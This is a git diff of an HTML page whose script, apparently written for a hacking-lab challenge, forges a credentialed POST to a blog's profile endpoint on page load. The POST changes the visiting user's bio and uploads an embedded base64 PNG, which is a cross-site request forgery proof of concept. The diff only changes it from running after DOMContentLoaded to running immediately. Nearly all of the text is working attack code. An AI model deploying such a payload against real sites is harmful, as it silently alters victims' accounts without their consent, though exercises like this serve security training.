@@ -8,51 +8,50 @@
 <body>
 
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            function sendPostRequest() {
-                const formData = new FormData();
-                formData.append('bio', 'cambio');
+        function sendPostRequest() {
+            const formData = new FormData();
+            formData.append('bio', 'cambio');
 
-                const base64data = 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAPCAIAAABiEdh4AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAB5SURBVChTzY+7DcAgEEMpKRkhozAOiyDGoGUDxiNWfDpQyL/KawDjJzjTXvJfoZQSY+R+ZM5FQGrMwWtz/vVLz7kXaq3e+5wzjyIgXTb0giB3zmEMay0TEVBFSlTTNmFTlpSSxCeEENjsM1w42gZdILM2tsFeuKG1FQwrQHYmbwizAAAAAElFTkSuQmCC';
-                const byteCharacters = atob(base64data);
-                const byteNumbers = new Array(byteCharacters.length);
+            const base64data = 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAPCAIAAABiEdh4AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAB5SURBVChTzY+7DcAgEEMpKRkhozAOiyDGoGUDxiNWfDpQyL/KawDjJzjTXvJfoZQSY+R+ZM5FQGrMwWtz/vVLz7kXaq3e+5wzjyIgXTb0giB3zmEMay0TEVBFSlTTNmFTlpSSxCeEENjsM1w42gZdILM2tsFeuKG1FQwrQHYmbwizAAAAAElFTkSuQmCC';
+            const byteCharacters = atob(base64data);
+            const byteNumbers = new Array(byteCharacters.length);
 
-                for (let i = 0; i < byteCharacters.length; i++) {
-                    byteNumbers[i] = byteCharacters.charCodeAt(i);
-                }
-                
-                const byteArray = new Uint8Array(byteNumbers);
-                const blob = new Blob([byteArray], { type: 'image/png' });
-
-                formData.append('profile_pic', blob, 'cbimage.png');
-
-                fetch('https://chl-9052949b-e589-41be-9955-2463cbd12998-blog-hacklab.softwareseguro.com.ar/profile', {
-                    method: 'POST',
-                    headers: {
-                        'Host': 'chl-adfec2d4-2e76-495d-9008-0aaf6670bc13-blog-hacklab.softwareseguro.com.ar',
-                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                        'Accept-Language': 'en-US,en;q=0.5',
-                        'Accept-Encoding': 'gzip, deflate, br',
-                        'Referer': 'https://chl-9052949b-e589-41be-9955-2463cbd12998-blog-hacklab.softwareseguro.com.ar/profile',
-                        'Origin': 'https://chl-9052949b-e589-41be-9955-2463cbd12998-blog-hacklab.softwareseguro.com.ar',
-                        'Sec-Fetch-Dest': 'empty',
-                        'Sec-Fetch-Mode': 'cors',
-                        'Sec-Fetch-Site': 'same-origin',
-                        'Te': 'trailers',
-                        'Cookie': '_ga=GA1.3.70668333.1724798273',
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    credentials: 'include',
-                    body: formData
-                })
-                .then(response => response.text())
-                .then(result => console.log('Success:', result))
-                .catch(error => console.error('Error:', error));
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
             }
+            
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], { type: 'image/png' });
 
-            sendPostRequest();
-        });
+            formData.append('profile_pic', blob, 'cbimage.png');
+
+            fetch('https://chl-9052949b-e589-41be-9955-2463cbd12998-blog-hacklab.softwareseguro.com.ar/profile', {
+                method: 'POST',
+                headers: {
+                    'Host': 'chl-adfec2d4-2e76-495d-9008-0aaf6670bc13-blog-hacklab.softwareseguro.com.ar',
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Referer': 'https://chl-9052949b-e589-41be-9955-2463cbd12998-blog-hacklab.softwareseguro.com.ar/profile',
+                    'Origin': 'https://chl-9052949b-e589-41be-9955-2463cbd12998-blog-hacklab.softwareseguro.com.ar',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Te': 'trailers',
+                    'Cookie': '_ga=GA1.3.70668333.1724798273',
+                    'ngrok-skip-browser-warning': 'true'
+                },
+                credentials: 'include',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(result => console.log('Success:', result))
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Ejecutar la función inmediatamente
+        sendPostRequest();
     </script>
 
 </body>
